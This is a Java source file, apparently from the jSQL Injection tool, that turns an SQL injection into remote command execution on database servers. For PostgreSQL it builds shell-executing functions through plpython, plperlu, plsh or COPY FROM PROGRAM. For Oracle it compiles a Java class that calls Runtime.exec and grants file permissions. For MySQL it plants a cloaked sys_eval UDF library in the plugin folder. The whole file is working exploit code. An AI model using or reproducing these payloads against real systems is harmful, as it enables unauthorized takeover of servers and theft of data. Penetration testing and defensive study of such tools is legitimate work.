package com.jsql.model.accessible;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.database.MockElement;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.JSqlRuntimeException;
import com.jsql.model.injection.vendor.model.VendorYaml;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.LogLevelUtil;
import com.jsql.util.StringUtil;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.UUID;
import java.util.function.BiPredicate;

public class UdfAccess {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();
    private static final String NAME_TABLE = "temp";
    private static final String RCE_JAVA_UTIL_SRC = "RCE_JAVA_UTIL_SRC";
    private static final String RCE_JAVA_UTIL_FUNC = "RCE_JAVA_UTIL_FUNC";
    private static final String BEGIN = "BEGIN";

    private final InjectionModel injectionModel;
    private final BiPredicate<String, String> biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -> {
        try {
            return this.buildSysEval(nameLibraryRandom);
        } catch (JSqlException e) {
            throw new JSqlRuntimeException(e);
        }
    };
    private String nameExtension = StringUtils.EMPTY;

    public UdfAccess(InjectionModel injectionModel) {
        this.injectionModel = injectionModel;
    }

    public void createExploitRcePostgres(ExploitMode exploitMode) throws JSqlException {
        if (!Arrays.asList(ExploitMode.AUTO, ExploitMode.QUERY_BODY).contains(exploitMode)) {
            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit mode not implemented, using query body");
        }

        this.nameExtension = this.createExtension("plpython3u");
        if (StringUtils.isEmpty(this.nameExtension)) {
            this.nameExtension = this.createExtension("plpython2u");
        }
        if (StringUtils.isEmpty(this.nameExtension)) {
            this.nameExtension = this.createExtension("plpythonu");
        }
        if (StringUtils.isEmpty(this.nameExtension)) {
            this.nameExtension = this.createExtension("plperlu");
        }
        if (StringUtils.isEmpty(this.nameExtension)) {
            this.nameExtension = this.createExtension("plsh");
        }
        if (StringUtils.isEmpty(this.nameExtension)) {
            this.nameExtension = this.createExtension("sql");
        }
        if (StringUtils.isEmpty(this.nameExtension)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: extension not found");
            return;
        }

        if (this.nameExtension.startsWith("plpython")) {
            this.injectionModel.injectWithoutIndex(String.join(
                "%0a",
                "; CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS text AS%20$$",
                "from subprocess import check_output as c",
                "return c(cmd).decode()",
                "$$%20LANGUAGE "+ this.nameExtension +";"
            ), "body#add-func");
        } else if (this.nameExtension.startsWith("plperlu")) {
            this.injectionModel.injectWithoutIndex(
                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS 'return `$_[0]`' LANGUAGE plperlu;"
            , "body#add-func");
        } else if (this.nameExtension.startsWith("plsh")) {
            this.injectionModel.injectWithoutIndex(
                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS '%23!/bin/sh%0a$1' LANGUAGE plsh;"
            , "body#add-func");
        } else if (this.nameExtension.startsWith("sql")) {
            this.injectionModel.injectWithoutIndex(";DROP TABLE IF EXISTS cmd_result;", "body#drop-tbl");
            this.injectionModel.injectWithoutIndex(";Create table cmd_result (str text);", "body#add-tbl");
            this.injectionModel.injectWithoutIndex(
                ";Create Or Replace Function exec_cmd() RETURNS void As%20$$%20copy cmd_result from program 'echo%20\"13\"\"37\"'$$%20language sql;",
            "body#add-func");
            this.injectionModel.injectWithoutIndex(";select exec_cmd();", "body#run-func");
            var result = this.getResult("select array_to_string(array(select str FROM cmd_result),'')", "body#confirm");
            if (!"1337".equals(result)) {
                return;
            }
        }

        var functions = this.getResult(
            "SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' and routine_name = 'exec_cmd'",
            "body#confirm"
        );
        if (!functions.contains("exec_cmd")) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: function not found");
            return;
        }

        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: function found for extension [{}]", this.nameExtension);

        var request = new Request();
        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_POSTGRES);
        request.setParameters(null, null);
        this.injectionModel.sendToViews(request);
    }

    private String createExtension(String nameExtension) throws JSqlException {
        LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Checking extension "+ nameExtension);
        this.injectionModel.injectWithoutIndex(";CREATE EXTENSION "+ nameExtension +";", "body#add-ext");
        String languages = this.getResult(
            "select array_to_string(array(select lanname FROM pg_language),'')",
            "body#confirm-ext"
        );
        if (languages.contains(nameExtension)) {
            return nameExtension;
        }
        return StringUtils.EMPTY;
    }

    public void createExploitRceOracle(ExploitMode exploitMode) throws JSqlException {
        if (!Arrays.asList(ExploitMode.AUTO, ExploitMode.QUERY_BODY).contains(exploitMode)) {
            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit method not implemented, using query body instead");
        }

        var pattern = " ; drop java source \"%s\";";
        this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_SRC), "body#drop-src");
        pattern = " ; drop function %s;";
        this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_FUNC), "body#drop-src");
        pattern = " ; %s ";
        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
            UdfAccess.BEGIN,
            "\\n",
            "EXECUTE IMMEDIATE 'create or replace and compile java source named \"",
            UdfAccess.RCE_JAVA_UTIL_SRC,
            "\" as import java.io.*; public class ", UdfAccess.RCE_JAVA_UTIL_SRC, "{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
            "\\n",
            "END;"
        )), "body#add-src");
        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
            UdfAccess.BEGIN,
            "\\n",
            "EXECUTE IMMEDIATE 'create or replace function ",
            UdfAccess.RCE_JAVA_UTIL_FUNC,
            "(p_cmd in varchar2) return varchar2 as language java name ''",
            UdfAccess.RCE_JAVA_UTIL_SRC,
            ".runCmd(java.lang.String) return String'';';",
            "\\n",
            "END;"
        )), "body#add-func");
        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
            UdfAccess.BEGIN,
            "\\n",
            "dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');",
            "\\n",
            "END;"
        )), "body#grant-exec");
        var nameDatabase = this.getResult(
            String.format(
                "SELECT object_name||'%s' FROM dba_objects WHERE object_name like '%s' and ROWNUM <= 1",
                VendorYaml.TRAIL_SQL,
                UdfAccess.RCE_JAVA_UTIL_FUNC
            ),
            "body#confirm"
        );
        if (!nameDatabase.contains(UdfAccess.RCE_JAVA_UTIL_FUNC)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: java function not found");
            return;
        }
        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: java function found");

        var request = new Request();
        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_ORACLE);
        request.setParameters(null, null);
        this.injectionModel.sendToViews(request);
    }

    public void createExploitUdfMysql(String pathNetshareFolder, ExploitMode exploitMode) throws JSqlException {
        if (this.injectionModel.getResourceAccess().isReadingNotAllowed()) {
            return;
        }

        var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificUnion().getNbIndexesFound() - 1;
        var pathPlugin = this.getResult("select@@plugin_dir", "udf#dir");
        if (StringUtils.isEmpty(pathPlugin)) {
            throw new JSqlException("Incorrect plugin folder: path is empty");
        }

        var versionOsMachine = this.getResult("select concat(@@version_compile_os,@@version_compile_machine)", "udf#check-os");
        if (StringUtils.isEmpty(versionOsMachine)) {
            throw new JSqlException("Incorrect remote machine: unknown system");
        }
        var isWin = versionOsMachine.toLowerCase().contains("win") && !versionOsMachine.toLowerCase().contains("linux");

        String nameLibrary;
        if (versionOsMachine.contains("64")) {
            nameLibrary = isWin ? "64.dll" : "64.so";
        } else {
            nameLibrary = isWin ? "32.dll" : "32.so";
        }

        pathPlugin = pathPlugin.replace("\\", "/");
        if (!pathPlugin.endsWith("/")) {
            pathPlugin = String.format("%s%s", pathPlugin, "/");
        }

        if (!this.injectionModel.getMediatorStrategy().getStack().isApplicable()) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit UDF requires stack query, trying anyway...");
        }
        String isSuccess = StringUtils.EMPTY;
        if (exploitMode == ExploitMode.NETSHARE) {
            if (!pathNetshareFolder.endsWith("\\")) {
                pathNetshareFolder += "\\";
            }
            UdfAccess.copyToShare(pathNetshareFolder, nameLibrary);
            isSuccess = this.byNetshare(
                nbIndexesFound,
                pathNetshareFolder,
                nameLibrary,
                pathPlugin,
                this.biPredConfirm
            );
        } else if (exploitMode == ExploitMode.AUTO || exploitMode == ExploitMode.QUERY_BODY) {
            if (StringUtil.GET.equals(this.injectionModel.getMediatorUtils().getConnectionUtil().getTypeRequest())) {
                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "GET too limited for UDF with body query, should use POST instead but using GET anyway...");
            }
            isSuccess = this.byQueryBody(
                nbIndexesFound,
                pathPlugin,
                nameLibrary,
                UdfAccess.toHexChunks(nameLibrary),
                this.biPredConfirm
            );
        }
        if (StringUtils.isEmpty(isSuccess) && exploitMode == ExploitMode.AUTO || exploitMode == ExploitMode.TEMP_TABLE) {
            var nameLibraryRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameLibrary;
            this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);
            this.biPredConfirm.test(pathPlugin, nameLibraryRandom);
        }
    }

    public String byQueryBody(
        int nbIndexesFound,
        String pathRemoteFolder,
        String nameExploit,
        List<String> hexChunks,
        BiPredicate<String,String> biPredConfirm
    ) {
        String nameExploitValidated = StringUtils.EMPTY;
        var pattern = " %s SELECT %s 0x%s into dumpfile '%s'";

        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
        this.injectionModel.injectWithoutIndex(String.format(pattern,
            "union",
            "'',".repeat(nbIndexesFound),
            String.join(StringUtils.EMPTY, hexChunks),
            pathRemoteFolder + nameExploitRandom
        ), "body#union-dump");
        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
            nameExploitValidated = nameExploitRandom;
        }
        if (StringUtils.isEmpty(nameExploitValidated)) {
            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Query body connection failure with union, trying with stack...");
            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
            this.injectionModel.injectWithoutIndex(String.format(pattern,
                ";",
                StringUtils.EMPTY,
                String.join(StringUtils.EMPTY, hexChunks),
                pathRemoteFolder + nameExploitRandom
            ), "body#stack-dump");
            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
                nameExploitValidated = nameExploitRandom;
            }
        }
        return nameExploitValidated;
    }

    public String byNetshare(
        int nbIndexesFound,
        String pathNetshareFolder,
        String nameExploit,
        String pathRemoteFolder,
        BiPredicate<String,String> biPredConfirm
    ) {
        String nameExploitValidated = StringUtils.EMPTY;
        var pathShareEncoded = pathNetshareFolder.replace("\\", "\\\\");
        var pattern = " %s SELECT %s load_file('%s') into dumpfile '%s'";

        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and union...");
        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
        this.injectionModel.injectWithoutIndex(String.format(pattern,
            "union",
            "'',".repeat(nbIndexesFound),
            pathShareEncoded + nameExploit,
            pathRemoteFolder + nameExploitRandom
        ), "udf#share-union");
        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
            nameExploitValidated = nameExploitRandom;
        }
        if (StringUtils.isEmpty(nameExploitValidated)) {
            LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and stack...");
            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
            this.injectionModel.injectWithoutIndex(String.format(pattern,
                ";",
                StringUtils.EMPTY,
                pathShareEncoded + nameExploit,
                pathRemoteFolder + nameExploitRandom
            ), "udf#share-stack");
            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
                nameExploitValidated = nameExploitRandom;
            }
        }
        return nameExploitValidated;
    }

    private static void copyToShare(String pathNetshare, String nameLibrary) throws JSqlException {
        try {
            URI original = Objects.requireNonNull(UdfAccess.class.getClassLoader().getResource("udf/" + nameLibrary)).toURI();
            Path originalPath = new File(original).toPath();
            Path copied = Paths.get(pathNetshare + nameLibrary);
            Files.copy(originalPath, copied, StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException | URISyntaxException e) {
            throw new JSqlException("Copy udf into local network share failure: " + e.getMessage());
        }
    }

    public void byTable(List<String> bodyHexChunks, String pathRemoteFile) throws JSqlException {
        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection with table and stack...");
        var nameDatabase = this.getResult("select database()", "tbl#dbname");
        if (StringUtils.isEmpty(nameDatabase) || StringUtil.INFORMATION_SCHEMA.equals(nameDatabase)) {
            nameDatabase = "mysql";
        }
        var nameTableRandom = UdfAccess.NAME_TABLE +"_"+ RandomStringUtils.secure().nextAlphabetic(8);  // underscore required, dash not allowed
        var nameSchemaTable = nameDatabase +"."+ nameTableRandom;
        this.injectionModel.injectWithoutIndex("; drop table "+ nameSchemaTable, "tbl#tbl");
        var countResult = this.getCountTable(nameDatabase, nameTableRandom);
        if (!"0".equals(countResult)) {
            throw new JSqlException("Drop table failure: "+ countResult);
        }
        this.injectionModel.injectWithoutIndex("; create table "+ nameSchemaTable +"(data longblob)", "tbl#create");
        countResult = this.getCountTable(nameDatabase, nameTableRandom);
        if (!"1".equals(countResult)) {
            throw new JSqlException("Create table failure: "+ countResult);
        }
        int indexChunk = 0;
        for (String chunk: bodyHexChunks) {
            if (indexChunk == 0) {
                this.injectionModel.injectWithoutIndex("; insert into "+ nameSchemaTable +"(data) values (0x"+chunk+")", "tbl#init");
            } else {
                this.injectionModel.injectWithoutIndex("; update "+ nameSchemaTable +" set data = concat(data,0x"+chunk+")", "tbl#fill");
            }
            indexChunk++;
        }
        this.injectionModel.injectWithoutIndex("; select data from "+ nameSchemaTable +" into dumpfile '"+ pathRemoteFile +"'", "tbl#dump");
    }

    private String getCountTable(String nameDatabase, String nameTableRandom) {
        try {
            return this.getResult(
                "select count(table_name) from information_schema.tables " +
                "where table_type like 'base table' and table_name = '"+ nameTableRandom +"' " +
                "and table_schema = '" + nameDatabase + "'",
                "tbl#check"
            );
        } catch (JSqlException e) {
            return e.getMessage();  // error message then logged
        }
    }

    private boolean buildSysEval(String nameLibrary) throws JSqlException {
        this.injectionModel.injectWithoutIndex("; drop function sys_eval", "udf#del-func");
        this.injectionModel.injectWithoutIndex(
            "; create function sys_eval returns string soname '"+ nameLibrary +"'",
            "udf#function"
        );
        var confirm = this.getResult("select group_concat(name)from mysql.func", "udf#confirm");
        if (!confirm.contains("sys_eval")) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "UDF failure: sys_eval not found");
            return false;
        }
        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "UDF successful: sys_eval found");

        var request = new Request();
        request.setMessage(Interaction.ADD_TAB_EXPLOIT_UDF);
        request.setParameters(null, null);
        this.injectionModel.sendToViews(request);
        return true;
    }

    public String runCommandRceOracle(String command, UUID uuidShell) {
        String result;
        try {
            result = this.getResult(
                String.format(
                    "SELECT %s('%s')||'%s' FROM dual",
                    UdfAccess.RCE_JAVA_UTIL_FUNC,
                    command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
                    VendorYaml.TRAIL_SQL
                ),
                "rce#run-cmd"
            );
        } catch (JSqlException e) {
            result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
        }
        var request = new Request();
        request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
        request.setParameters(uuidShell, result);
        this.injectionModel.sendToViews(request);
        return result;
    }

    public String runCommandRcePostgres(String command, UUID uuidShell) {
        String result;
        try {
            if ("sql".equals(this.nameExtension)) {
                this.injectionModel.injectWithoutIndex(";delete from cmd_result;", "body#empty-tbl");
                this.injectionModel.injectWithoutIndex(
                    ";Create Or Replace Function exec_cmd() RETURNS void As%20$$%20copy cmd_result from program '"+ command.replace(StringUtils.SPACE, "%20") +"'$$%20language sql;",
                "body#add-func");
                this.injectionModel.injectWithoutIndex(";select exec_cmd();", "rce#run-cmd");
                result = this.getResult("select array_to_string(array(select str FROM cmd_result),'\\n')||'"+ VendorYaml.TRAIL_SQL +"'", "body#result") +"\n";
            } else {
                result = this.getResult(
                    String.format(
                        "SELECT exec_cmd('%s')||'%s'",
                        command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
                        VendorYaml.TRAIL_SQL
                    ),
                    "rce#run-cmd"
                );
            }
        } catch (JSqlException e) {
            result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
        }
        var request = new Request();
        request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
        request.setParameters(uuidShell, result);
        this.injectionModel.sendToViews(request);
        return result;
    }

    public String runCommandUdfMysql(String command, UUID uuidShell) {
        String result;
        try {
            result = this.getResult(  // 0xff splits single result in many chunks => replace by space
                "select cast(replace(sys_eval('"+ command +"'),0xff,0x20)as char(70000) character set utf8)",
                "udf#run-cmd"
            );
        } catch (JSqlException e) {
            result = "Command failure: "+ e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
        }
        var request = new Request();
        request.setMessage(Interaction.GET_EXPLOIT_UDF_RESULT);
        request.setParameters(uuidShell, result);
        this.injectionModel.sendToViews(request);
        return result;
    }

    private static List<String> toHexChunks(String filename) throws JSqlException {
        try {
            byte[] fileData = Objects.requireNonNull(  // getResource > toURI > toPath > readAllBytes() not possible in .jar
                UdfAccess.class.getClassLoader().getResourceAsStream("udf/"+ filename +".cloak")
            ).readAllBytes();
            fileData = StringUtil.uncloak(fileData);
            return StringUtil.toHexChunks(fileData);
        } catch (IOException e) {
            throw new JSqlException(e);
        }
    }

    public String getResult(String query, String metadata) throws JSqlException {
        var sourcePage = new String[]{ StringUtils.EMPTY };
        return new SuspendableGetRows(this.injectionModel).run(
            query,
            sourcePage,
            false,
            0,
            MockElement.MOCK,
            metadata
        );
    }
}
